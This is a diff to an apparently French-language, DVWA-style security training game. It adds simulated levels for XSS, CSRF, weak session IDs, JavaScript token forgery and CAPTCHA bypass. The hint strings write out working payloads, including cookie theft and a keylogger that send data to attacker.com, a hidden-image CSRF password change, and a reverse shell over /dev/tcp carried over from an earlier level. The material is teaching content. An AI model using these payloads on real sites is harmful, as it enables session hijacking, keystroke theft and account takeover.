@@ -88,6 +88,55 @@ export const WEB_LEVELS = [
     url: 'http://localhost:8080/vulnerabilities/upload/',
     intro: 'L\'upload n\'est pas filtré. Téléverse un webshell PHP, transforme-le en reverse shell interactif, stabilise le TTY, puis contourne un filtre d\'extension par double extension.',
   },
+  {
+    n: 7, id: 'xss_r',
+    title: 'XSS Réfléchi',
+    owasp: 'A03:2021 — Injection · T1059',
+    url: 'http://localhost:8080/vulnerabilities/xss_r/',
+    intro: 'Le champ Name n\'est pas filtré. Injecte un script d\'alerte, vole le cookie de session, simule une exfiltration, puis contourne le filtre avec une balise alternative.',
+  },
+  {
+    n: 8, id: 'xss_s',
+    title: 'XSS Stocké',
+    owasp: 'A03:2021 — Injection · T1059',
+    url: 'http://localhost:8080/vulnerabilities/xss_s/',
+    intro: 'Le guestbook sauvegarde ton script. Réalise une injection persistante, contourne la limite maxlength du nom, et crée un keylogger.',
+  },
+  {
+    n: 9, id: 'xss_d',
+    title: 'XSS DOM-based',
+    owasp: 'A03:2021 — Injection · T1059',
+    url: 'http://localhost:8080/vulnerabilities/xss_d/',
+    intro: 'Le script côté client utilise l\'URL pour mettre à jour la page. Injecte via ?default= et via le fragment # (invisible pour le serveur).',
+  },
+  {
+    n: 10, id: 'csrf',
+    title: 'Cross-Site Request Forgery (CSRF)',
+    owasp: 'A07:2021 — Identification & Auth Failures · T1600',
+    url: 'http://localhost:8080/vulnerabilities/csrf/',
+    intro: 'Ce formulaire permet de changer son mot de passe. Forge une requête malveillante (ex: balise img) qui forcera un utilisateur authentifié à modifier son mot de passe à son insu.',
+  },
+  {
+    n: 11, id: 'weak_id',
+    title: 'Weak Session IDs',
+    owasp: 'A07:2021 — Identification Failures · T1110',
+    url: 'http://localhost:8080/vulnerabilities/weak_id/',
+    intro: 'Le cookie dvwaSession semble très prévisible. Analyse la séquence en générant quelques sessions, puis vole la session du prochain utilisateur (hijacking).',
+  },
+  {
+    n: 12, id: 'js_attack',
+    title: 'JavaScript Attacks',
+    owasp: 'A05:2021 — Security Misconfiguration',
+    url: 'http://localhost:8080/vulnerabilities/javascript/',
+    intro: 'Le serveur refuse la soumission si le token ne correspond pas. Inspecte le code JavaScript client pour comprendre comment le token est généré (MD5 de la chaîne inversée) et forge un token valide.',
+  },
+  {
+    n: 13, id: 'captcha',
+    title: 'Insecure CAPTCHA',
+    owasp: 'A04:2021 — Insecure Design',
+    url: 'http://localhost:8080/vulnerabilities/captcha/',
+    intro: 'Le serveur demande de valider un CAPTCHA pour modifier le mot de passe, mais la validation est imparfaite. Contourne cette protection en soumettant directement le bon paramètre caché.',
+  },
 ];
 
 export const MAX_LEVEL = WEB_LEVELS.length;
@@ -108,6 +157,13 @@ export function initialProg(n) {
     };
     case 5: return { traversal: false, wrapperRead: false, decoded: false, logInjected: false, rce: false };
     case 6: return { shellCreated: false, dblFile: false, uploaded: false, rce: false, listener: false, revshell: false, stabilized: false, bypass: false };
+    case 7: return { basic: false, cookie: false, exfil: false, bypass: false };
+    case 8: return { messages: [{ name: 'Admin', msg: 'Bienvenue sur le Guestbook !' }], persistent: false, bypassMax: false, keylogger: false };
+    case 9: return { paramOk: false, fragOk: false };
+    case 10: return { analyzed: false, exploited: false };
+    case 11: return { seqSeen: 0, currentId: 1000, hijacked: false };
+    case 12: return { reversed: false, md5Ok: false };
+    case 13: return { bypassed: false };
     default: return {};
   }
 }
@@ -156,6 +212,36 @@ export function objectives(n, p) {
       { label: 'Stabiliser le TTY',                               done: p.stabilized },
       { label: 'Contourner un filtre (double extension)',         done: p.bypass, bonus: true },
     ];
+    case 7: return [
+      { label: 'Payload basique (<script>alert(1)</script>)',     done: p.basic },
+      { label: 'Vol de cookie (document.cookie)',                 done: p.cookie },
+      { label: 'Exfiltration simulée (document.location)',        done: p.exfil },
+      { label: 'Contournement de filtre (<ScRiPt> ou <img>)',     done: p.bypass, bonus: true },
+    ];
+    case 8: return [
+      { label: 'Injection persistante (alert)',                   done: p.persistent },
+      { label: 'Contournement limite maxlength',                  done: p.bypassMax },
+      { label: 'Simulation keylogger (onkeypress)',               done: p.keylogger, bonus: true },
+    ];
+    case 9: return [
+      { label: 'Payload via ?param (?default=...)',               done: p.paramOk },
+      { label: 'Payload via fragment (#...)',                     done: p.fragOk },
+    ];
+    case 10: return [
+      { label: 'Analyser la requête de changement de mot de passe', done: p.analyzed },
+      { label: 'Créer un payload <img> forgeant la requête CSRF',   done: p.exploited },
+    ];
+    case 11: return [
+      { label: 'Générer plusieurs sessions (séquence visible)',    done: p.seqSeen >= 3 },
+      { label: 'Prédire l\'ID suivant et hijacker la session',    done: p.hijacked },
+    ];
+    case 12: return [
+      { label: 'Comprendre la logique (phrase inversée)',          done: p.reversed },
+      { label: 'Forger le bon token MD5 et soumettre',             done: p.md5Ok },
+    ];
+    case 13: return [
+      { label: 'Bypasser le CAPTCHA (passed_captcha=true)',        done: p.bypassed },
+    ];
     default: return [];
   }
 }
@@ -166,6 +252,13 @@ const hasAny = (s, ...subs) => subs.some(x => s.toLowerCase().includes(x.toLower
 
 const doneL5 = (p) => p.traversal && p.wrapperRead && p.decoded;
 const doneL6 = (p) => p.shellCreated && p.uploaded && p.rce && p.revshell && p.stabilized;
+const doneL7 = (p) => p.basic && p.cookie && p.exfil;
+const doneL8 = (p) => p.persistent && p.bypassMax;
+const doneL9 = (p) => p.paramOk && p.fragOk;
+const doneL10 = (p) => p.analyzed && p.exploited;
+const doneL11 = (p) => p.seqSeen >= 3 && p.hijacked;
+const doneL12 = (p) => p.reversed && p.md5Ok;
+const doneL13 = (p) => p.bypassed;
 
 // ═══════════════════════════════════════════════════════════════════════════
 //  WEB FORM submission handler
@@ -391,6 +484,198 @@ export function handleWeb(n, prog, action) {
       return { lines: out, prog: p, done: doneL6(p), notify: '🚩 Webshell uploadé !' };
     }
     return { lines: [c('Fichier accepté : ' + name + ' (mais ce n\'est pas un webshell PHP).', C.dim)], prog: p, done: false };
+  }
+
+  // ─── Level 7 : XSS Réfléchi ───
+  if (n === 7) {
+    if (!v) return { lines: [], prog: p, done: false, webError: 'Veuillez entrer un nom.' };
+    const out = [];
+    const low = v.toLowerCase();
+    let notify = null;
+    
+    const hasScript = low.includes('<script>');
+    const hasAlert = low.includes('alert');
+    const hasCookie = low.includes('document.cookie');
+    const hasLoc = low.includes('document.location') && low.includes('attacker.com');
+    const hasAlt = (low.includes('<script') && !low.includes('<script>')) || low.includes('<img ') || low.includes('<svg ');
+
+    if (hasAlert && !hasCookie && hasScript) {
+      p.basic = true; notify = '🚩 Payload basique validé !';
+      out.push(c(`Hello ${v}`, C.white));
+      out.push(c(`[NAVIGATEUR] Alert: 1`, C.cyan));
+    } else if (hasAlert && hasCookie) {
+      p.cookie = true; notify = '🚩 Vol de cookie validé !';
+      out.push(c(`Hello ${v}`, C.white));
+      out.push(c(`[NAVIGATEUR] Alert: security=low; dvwaSession=1; PHPSESSID=xxxxxx`, C.cyan));
+    } else if (hasLoc) {
+      p.exfil = true; notify = '🚩 Exfiltration simulée validée !';
+      out.push(c(`Hello ${v}`, C.white));
+      out.push(c(`[NAVIGATEUR] Redirection vers : http://attacker.com/?c=security=low; PHPSESSID=xxxxxx`, C.cyan));
+    } else if (hasAlert && hasAlt) {
+      p.bypass = true; notify = '🚩 Contournement de filtre validé !';
+      out.push(c(`Hello ${v}`, C.white));
+      out.push(c(`[NAVIGATEUR] Alert: 1`, C.cyan));
+    } else {
+      out.push(c(`Hello ${v}`, C.white));
+    }
+    
+    return { lines: out, prog: p, done: doneL7(p), notify };
+  }
+
+  // ─── Level 8 : XSS Stocké ───
+  if (n === 8) {
+    const name = (action.name || '').trim();
+    const msg = (action.message || '').trim();
+    if (!name || !msg) return { lines: [], prog: p, done: false, webError: 'Nom et message requis.' };
+    
+    let notify = null;
+    const low = msg.toLowerCase();
+    
+    if (name.length > 10) {
+      p.bypassMax = true;
+      notify = '🚩 Bypass maxlength validé !';
+    }
+    
+    if (low.includes('<script>') && low.includes('alert')) {
+      p.persistent = true;
+      if (!notify) notify = '🚩 Injection persistante validée !';
+    }
+    if (low.includes('document.onkeypress') || (low.includes('key') && low.includes('image'))) {
+      p.keylogger = true;
+      notify = '🚩 Keylogger simulé !';
+    }
+    
+    p.messages = [...(p.messages || []), { name, msg }];
+    const out = [c(`[SERVEUR] Message sauvegardé en base de données.`, C.green)];
+    if (p.persistent || p.keylogger) {
+      out.push(c(`[NAVIGATEUR] Script exécuté lors du rendu de la liste des messages !`, C.cyan));
+    }
+    
+    return { lines: out, prog: p, done: doneL8(p), notify };
+  }
+
+  // ─── Level 9 : XSS DOM-based ───
+  if (n === 9) {
+    const url = action.url || '';
+    let notify = null;
+    const out = [];
+    const low = url.toLowerCase();
+    
+    out.push(c(`[NAVIGATEUR] Navigation vers : ${url}`, C.dim));
+    
+    if (low.includes('?default=') && low.includes('<script>') && low.includes('alert')) {
+      p.paramOk = true; notify = '🚩 Payload via paramètre validé !';
+      out.push(c(`[NAVIGATEUR] Le JavaScript de la page a lu document.URL et inséré l'entrée.`, C.cyan));
+      out.push(c(`[NAVIGATEUR] Alert: 1`, C.cyan));
+    }
+    else if (low.includes('#') && (low.includes('<script') || low.includes('<img ')) && low.includes('alert')) {
+      p.fragOk = true; notify = '🚩 Payload via fragment validé ! (Invisible au serveur)';
+      out.push(c(`[NAVIGATEUR] Le JavaScript de la page a lu location.hash et inséré l'entrée.`, C.cyan));
+      out.push(c(`[NAVIGATEUR] Alert: 1`, C.cyan));
+    } else {
+      out.push(c(`[NAVIGATEUR] Page chargée normalement.`, C.white));
+    }
+    
+    return { lines: out, prog: p, done: doneL9(p), notify };
+  }
+
+  // ─── Level 10 : CSRF ───
+  if (n === 10) {
+    let notify = null;
+    const out = [];
+    if (action.action === 'change') {
+      p.analyzed = true;
+      notify = '🚩 Requête légitime analysée';
+      out.push(c(`[SERVEUR] Requête GET reçue : ?password_new=***&password_conf=***&Change=Change`, C.dim));
+      out.push(c(`[SERVEUR] Mot de passe modifié pour l'utilisateur actuel.`, C.green));
+    } else if (action.action === 'exploit') {
+      const payload = action.payload || '';
+      const low = payload.toLowerCase();
+      if (low.includes('<img') && low.includes('?password_new=') && low.includes('change=change')) {
+        p.exploited = true;
+        notify = '🚩 Payload CSRF fonctionnel !';
+        out.push(c(`[NAVIGATEUR VICTIME] Rendu de la page malveillante...`, C.dim));
+        out.push(c(`[NAVIGATEUR VICTIME] Le navigateur tente de charger l'image et envoie silencieusement la requête GET au serveur avec les cookies de la victime.`, C.cyan));
+        out.push(c(`[SERVEUR] Mot de passe de la victime modifié !`, C.green));
+      } else {
+        out.push(c(`[SIMULATEUR] Payload inefficace ou mal formaté. Vérifie la balise <img> et l'URL.`, C.yellow));
+      }
+    }
+    return { lines: out, prog: p, done: doneL10(p), notify };
+  }
+
+  // ─── Level 11 : Weak Session IDs ───
+  if (n === 11) {
+    let notify = null;
+    const out = [];
+    if (action.action === 'generate') {
+      p.currentId += 1;
+      p.seqSeen += 1;
+      if (p.seqSeen === 3) notify = '🚩 Séquence identifiée';
+      out.push(c(`[SERVEUR] Nouvelle session générée.`, C.dim));
+      out.push(c(`Set-Cookie: dvwaSession=${p.currentId}`, C.cyan));
+    } else if (action.action === 'hijack') {
+      const guess = parseInt(action.guess, 10);
+      if (guess === p.currentId + 1) {
+        p.hijacked = true;
+        notify = '🚩 Session future hijackée !';
+        p.currentId += 1;
+        out.push(c(`[SERVEUR] Cookie dvwaSession=${guess} reçu.`, C.dim));
+        out.push(c(`[SERVEUR] Bienvenue, utilisateur de la session ${guess} ! Vous avez accès à son compte.`, C.green));
+      } else {
+        out.push(c(`[SERVEUR] Session ${guess} invalide ou non existante.`, C.yellow));
+      }
+    }
+    return { lines: out, prog: p, done: doneL11(p), notify };
+  }
+
+  // ─── Level 12 : JavaScript Attacks ───
+  if (n === 12) {
+    let notify = null;
+    const out = [];
+    const phrase = action.phrase || '';
+    const token = action.token || '';
+    const reversed = phrase.split('').reverse().join('');
+    
+    if (token === reversed && phrase.length > 0) {
+      p.reversed = true;
+      notify = '🚩 Logique d\'inversion comprise';
+      out.push(c(`[SERVEUR] Le token fourni est la phrase inversée, mais il manque l'étape MD5.`, C.yellow));
+    } 
+    
+    const isExplicitCall = token.toLowerCase() === 'md5(' + reversed.toLowerCase() + ')';
+    if (isExplicitCall && phrase.length > 0) {
+      p.reversed = true;
+      p.md5Ok = true;
+      notify = '🚩 Protection JavaScript contournée !';
+      out.push(c(`[SERVEUR] Token MD5 calculé côté attaquant et validé par le serveur. Succès !`, C.green));
+    } else if (token !== reversed && !isExplicitCall && action.action === 'submit') {
+      out.push(c(`[SERVEUR] Token invalide. La phrase était "${phrase}".`, C.red));
+    }
+    
+    return { lines: out, prog: p, done: doneL12(p), notify };
+  }
+
+  // ─── Level 13 : Insecure CAPTCHA ───
+  if (n === 13) {
+    let notify = null;
+    const out = [];
+    const req = action.payload || '';
+    
+    out.push(c(`[SERVEUR] Requête HTTP reçue :`, C.dim));
+    out.push(c(`POST /vulnerabilities/captcha/`, C.grey));
+    out.push(c(`Body: ${req}`, C.grey));
+
+    if (req.includes('step=2') && req.includes('passed_captcha=true')) {
+      p.bypassed = true;
+      notify = '🚩 CAPTCHA contourné !';
+      out.push(c(`[SERVEUR] Paramètre passed_captcha=true détecté. Le serveur fait confiance au client...`, C.yellow));
+      out.push(c(`[SERVEUR] Changement de mot de passe autorisé !`, C.green));
+    } else {
+      out.push(c(`[SERVEUR] Échec : CAPTCHA non validé (manque step=2 ou passed_captcha=true).`, C.red));
+    }
+    
+    return { lines: out, prog: p, done: doneL13(p), notify };
   }
 
   return { lines: [], prog: p, done: false };
@@ -769,6 +1054,12 @@ export function handleTerm(n, prog, line, ctx) {
     return { lines: [c(`${cmd}: commande non reconnue. Tape "?" pour la liste du niveau.`, C.grey)], prog: p, done: false };
   }
 
+  // ─── Level 7 to 13 : Web Logic ───
+  if (n >= 7 && n <= 13) {
+    if (cmd === 'curl') return { lines: [c('curl: utilise l\'interface web pour ces vulnérabilités ←', C.dim)], prog: p, done: false };
+    return { lines: [c('Ce niveau s\'exploite via la page web (à gauche). Le terminal sert uniquement à tes notes.', C.grey)], prog: p, done: false };
+  }
+
   return { lines: [c(`${cmd}: commande non reconnue`, C.grey)], prog: p, done: false };
 }
 
@@ -818,6 +1109,36 @@ export function getNextStep(n, prog) {
       if (!p.listener) return { action: 'Terminal', hint: 'nc -lvnp 4444', explain: 'Ouvre le listener pour le reverse shell' };
       if (!p.revshell) return { action: 'Terminal', hint: 'curl --get .../shell.php --data-urlencode "cmd=bash -c \'bash -i >& /dev/tcp/KALI/4444 0>&1\'"', explain: 'Déclenche le reverse shell' };
       if (!p.stabilized) return { action: 'Terminal (reverse)', hint: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", explain: 'Stabilise le TTY' };
+      return null;
+    case 7:
+      if (!p.basic) return { action: 'Web', hint: '<script>alert(1)</script>', explain: 'Affiche une alerte simple' };
+      if (!p.cookie) return { action: 'Web', hint: '<script>alert(document.cookie)</script>', explain: 'Affiche le cookie de session' };
+      if (!p.exfil) return { action: 'Web', hint: '<script>document.location="http://attacker.com/?c="+document.cookie</script>', explain: 'Redirige vers un site contrôlé par l\'attaquant avec le cookie' };
+      if (!p.bypass) return { action: 'Web', hint: '<img src=x onerror=alert(1)>', explain: 'Utilise une balise alternative pour contourner un filtre sur <script>' };
+      return null;
+    case 8:
+      if (!p.persistent) return { action: 'Web', hint: '<script>alert(1)</script> dans le message', explain: 'Enregistre un script qui s\'exécutera à chaque visite' };
+      if (!p.bypassMax) return { action: 'Web', hint: 'Modifie maxlength="10" via F12, puis saisis un nom long', explain: 'Contourne la limitation de taille côté client' };
+      if (!p.keylogger) return { action: 'Web', hint: '<script>document.onkeypress = function(e){ new Image().src="http://attacker.com/log?k="+e.key; }</script>', explain: 'Injecte un keylogger pour voler les frappes' };
+      return null;
+    case 9:
+      if (!p.paramOk) return { action: 'Web', hint: '?default=<script>alert(1)</script>', explain: 'Injecte un payload via le paramètre de query string' };
+      if (!p.fragOk) return { action: 'Web', hint: '#<img src=x onerror=alert(1)>', explain: 'Injecte un payload via le fragment URL (le # n\'est pas envoyé au serveur)' };
+      return null;
+    case 10:
+      if (!p.analyzed) return { action: 'Web', hint: 'Soumets le formulaire normalement', explain: 'Comprends la structure de la requête' };
+      if (!p.exploited) return { action: 'Web', hint: 'Injecte une balise <img> avec l\'URL de changement de mdp', explain: 'Forge la requête CSRF invisible' };
+      return null;
+    case 11:
+      if (p.seqSeen < 3) return { action: 'Web', hint: 'Clique sur Generate Session 3 fois', explain: 'Observe l\'incrémentation du cookie' };
+      if (!p.hijacked) return { action: 'Web', hint: 'Prédis l\'ID suivant et Hijack', explain: 'Vole la session du prochain utilisateur' };
+      return null;
+    case 12:
+      if (!p.reversed) return { action: 'Web', hint: 'Tape "sseccus" comme Token', explain: 'Montre que tu as compris l\'inversion' };
+      if (!p.md5Ok) return { action: 'Web', hint: 'Tape "md5(sseccus)" comme Token', explain: 'Simule le hachage JS local' };
+      return null;
+    case 13:
+      if (!p.bypassed) return { action: 'Web', hint: 'step=2&password_new=a&password_conf=a&passed_captcha=true', explain: 'Bypasse le CAPTCHA' };
       return null;
     default:
       return null;
@@ -874,6 +1195,40 @@ export function hints(n) {
       'Terminal : curl --get .../shell.php --data-urlencode "cmd=' + revsh('KALI') + '"',
       'Reverse : python3 -c \'import pty; pty.spawn("/bin/bash")\'   (stabilisation TTY)',
       'Bonus : cp shell.php shell.php.jpg  → uploader "shell.php.jpg" (double extension)',
+    ];
+    case 7: return [
+      'Web : <script>alert(1)</script>',
+      'Web : <script>alert(document.cookie)</script>',
+      'Web : <script>document.location="http://attacker.com/?c="+document.cookie</script>',
+      'Bonus (Bypass) : <ScRiPt>alert(1)</ScRiPt> ou <img src=x onerror=alert(1)>',
+    ];
+    case 8: return [
+      'Web (Name) : Inspecte le HTML (F12) et modifie maxlength="10"',
+      'Web (Message) : <script>alert(1)</script>',
+      'Bonus (Keylogger) : <script>document.onkeypress = function(e){ new Image().src = "http://attacker.com/log?k=" + e.key; }</script>',
+    ];
+    case 9: return [
+      'Web (URL) : ?default=<script>alert(1)</script>',
+      'Web (URL) : #<img src=x onerror=alert(1)>',
+      'Note : Le serveur ne voit jamais ce qui suit le #, c\'est géré 100% côté client.',
+    ];
+    case 10: return [
+      'Analyse : Modifie le mot de passe normalement et observe l\'URL.',
+      'Exploit : <img src="http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">',
+    ];
+    case 11: return [
+      'Génère 3 sessions pour voir que le cookie s\'incrémente de 1 à chaque fois.',
+      'Calcule le prochain ID (actuel + 1) et saisis-le dans la zone Hijack.',
+    ];
+    case 12: return [
+      'Inspecte le fichier js_attack.js (simulé). Il prend ta phrase, l\'inverse, et la hache en MD5.',
+      'Phrase : "success" → inversée : "sseccus"',
+      'Saisis directement "md5(sseccus)" dans le champ Token pour simuler l\'exécution locale.',
+    ];
+    case 13: return [
+      'La requête légitime de l\'étape 2 envoie step=2 et vérifie le captcha.',
+      'Le serveur a une faille de logique : il fait confiance au paramètre passed_captcha=true.',
+      'Payload : step=2&password_new=a&password_conf=a&passed_captcha=true',
     ];
     default: return [];
   }
